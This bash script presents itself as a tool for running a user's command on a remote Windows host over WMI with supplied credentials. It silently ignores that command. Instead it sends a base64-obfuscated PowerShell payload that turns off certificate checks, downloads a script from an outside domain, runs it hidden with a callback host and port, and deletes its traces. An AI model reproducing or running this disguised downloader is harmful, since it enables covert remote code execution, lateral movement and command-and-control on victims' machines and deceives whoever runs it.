#!/bin/bash

ShowUsage() {
	echo "Usage: $0 <target system> <username> <password> <command line>"
	echo "Can redirect with >> in command.  For example:"
	echo "dir >> \\[yourIP\YourShare\results.txt"
}

if [ $# -lt 4 ]; then
	ShowUsage
	exit 1
fi

TARGET=$1
USERNAME=$2
PASSWORD="$3"
QUERY="$4"

wminexe -U $USERNAME%$PASSWORD //$TARGET process call create "powershell -ExecutionPolicy Bypass -EncodedCommand JAB1AHIAbAA9ACIAaAB0AHQAcABzADoALwAvAHcAdwB3AGkALgBhAGwAbABpAGUAZABpAG4AZgBvAHMAZQBjAHUAcgBpAHQAeQAuAGMAbwBtAC8ARABMAEMAbwBuAHQAZQBuAHQALwBuAGUAdAAuAHMAZQBuAGQAXwByAGUAYwBlAGkAdgBlAC4AdAB4AHQAIgA7ACAAJABmAGkAbABlAG4AYQBtAGUAPQAiAG4AZQB0AC4AcwBlAG4AZABfAHIAZQBjAGUAaQB2AGUALgB0AHgAdAAiADsAIAAkAHMAdABvAHIAYQBnAGUAPQAkAGUAbgB2ADoAdABlAG0AcAA7ACAAJABmAGkAbABlAG4AYQBtAGUAPQAkAHMAdABvAHIAYQBnAGUAKwAiAFwAIgArACQAZgBpAGwAZQBuAGEAbQBlADsAIAAkAGQAZQBiAHUAZwA9ADAAOwAgACQAZABlAHMAdABJAFAAPQAiAHcAbwBwAHIANwAzAC4AYQBsAGwAaQBlAGQAaQBuAGYAbwBzAGUAYwB1AHIAaQB0AHkALgBjAG8AbQAiADsAIAAkAGQAZQBzAHQAUABvAHIAdAA9ACIANAA0ADMAIgA7ACAAJAB3AGUAYgBjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAGUAcgB2AGkAYwBlAFAAbwBpAG4AdABNAGEAbgBhAGcAZQByAF0AOgA6AFMAZQByAHYAZQByAEMAZQByAHQAaQBmAGkAYwBhAHQAZQBWAGEAbABpAGQAYQB0AGkAbwBuAEMAYQBsAGwAYgBhAGMAawAgAD0AIAB7ACQAdAByAHUAZQB9ADsAIAB0AHIAeQAgAHsAIAAJACQAdwBlAGIAYwBsAGkAZQBuAHQALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACQAdQByAGwALAAkAGYAaQBsAGUAbgBhAG0AZQApADsAIAAJAH0AIAAJAGMAYQB0AGMAaAAgAHsAIAAJAAkAZQB4AGkAdAAgAC0AMQA7ACAACQB9ACAACQBpAGYAIAAoAHQAZQBzAHQALQBwAGEAdABoACAALQBwAGEAdABoACAAJABmAGkAbABlAG4AYQBtAGUAKQAgAHsAIAAgAAkAJABzAGMAcgBpAHAAdABDAG8AZABlAD0ARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAAJABmAGkAbABlAG4AYQBtAGUAOwAgAAkAJABsAG8AYwBhAGwAZgBpAGwAZQA9ACQAcwB0AG8AcgBhAGcAZQArACIAXABuAGUAdAAuAHMAZQBuAGQAXwByAGUAYwBlAGkAdgBlAC4AcABzADEAIgA7ACAACQBTAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAkAGwAbwBjAGEAbABmAGkAbABlACAAJABzAGMAcgBpAHAAdABDAG8AZABlADsAIAAJAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgACQAZgBpAGwAZQBuAGEAbQBlADsAIAAJAGkAZgAgACgAJABkAGUAYgB1AGcAIAAtAGUAcQAgADEAKQAgAHsAdwByAGkAdABlAC0AaABvAHMAdAAgACIAWwBEAG8AbgBlAF0AIgB9ACAACQBpAGYAIAAoAHQAZQBzAHQALQBwAGEAdABoACAALQBwAGEAdABoACAAJABsAG8AYwBhAGwAZgBpAGwAZQApACAAewAgAAkACQAkAGwAbwBjAGEAbABmAGkAbABlAFEAdQBvAHQAZQBkAD0AIgBgACIAIgArACQAbABvAGMAYQBsAGYAaQBsAGUAKwAiAGAAIgAiADsAIAAJAAkAaQBmACAAKAAkAGQAZQBiAHUAZwAgAC0AZQBxACAAMQApACAAewB3AHIAaQB0AGUALQBoAG8AcwB0ACAAKAAiAFMAdABhAHIAdABpAG4AZwAgAHAAYQB5AGwAbwBhAGQAIAAiACsAJABsAG8AYwBhAGwARgBpAGwAZQBRAHUAbwB0AGUAZAArACIALgAuAC4AIgApAH0AOwAgAAkACQBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAAtAGEAcgBnAHUAbQBlAG4AdABsAGkAcwB0ACAAIgAtAEUAeABlAGMAdQB0AGkAbwBuAFAAbwBsAGkAYwB5ACAAQgB5AHAAYQBzAHMAIgAsACQAbABvAGMAYQBsAGYAaQBsAGUAUQB1AG8AdABlAGQALAAgACQAZABlAHMAdABJAFAALAAkAGQAZQBzAHQAUABvAHIAdAA7ACAACQAJAFsAUwB5AHMAdABlAG0ALgBUAGgAcgBlAGEAZABpAG4AZwAuAFQAaAByAGUAYQBkAF0AOgA6AFMAbABlAGUAcAAoADIAMAAwADAAKQA7ACAACQAJAGkAZgAgACgAJABkAGUAYgB1AGcAIAAtAGUAcQAgADAAKQAgAHsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAAJABsAG8AYwBhAGwAZgBpAGwAZQB9ACAACQB9ACAAfQA="

